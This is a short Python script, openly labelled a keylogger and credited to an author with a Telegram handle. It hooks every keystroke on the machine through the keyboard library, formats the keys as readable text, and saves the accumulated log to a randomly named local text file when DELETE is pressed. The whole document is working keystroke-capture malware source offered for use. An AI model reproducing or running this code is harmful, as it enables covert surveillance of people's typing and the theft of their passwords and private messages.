
import keyboard
import random,pyfiglet
from keyboard._keyboard_event import KEY_DOWN
from datetime import datetime
from rich.console import Console
console = Console()
console.print("[magenta]" + pyfiglet.figlet_format("KeyLogger", font="slant") + "[/magenta]")
console.print("[bold cyan] made by CLOTI (Xsarz)[/] [bold yellow]Telegram: t.me/DXsarz[/]")
console.print("[bold cyan] Для сохранения нажмите DELETE[/]")
log = []
timer=0
def callback(e):
    name = e.name
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        elif name == "delete":
        	name = ""
        	global log, timer, t
        	g=''

        	for x in range(6):
        		g += str(random.randint(1,1000))
        	total = str(log).replace('[', '').replace(']', '').replace("'", "").replace(',', '')
        	name_file = f"KeyLogger_logs{g}"
        	my_file = open(f"{name_file}.txt", "w+")
        	my_file.write(total)
        	my_file.close();log = []

        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
    if timer == 0:
        log += name
        timer =1
    elif timer ==1:
        timer = 0





keyboard.hook(callback)
keyboard.wait()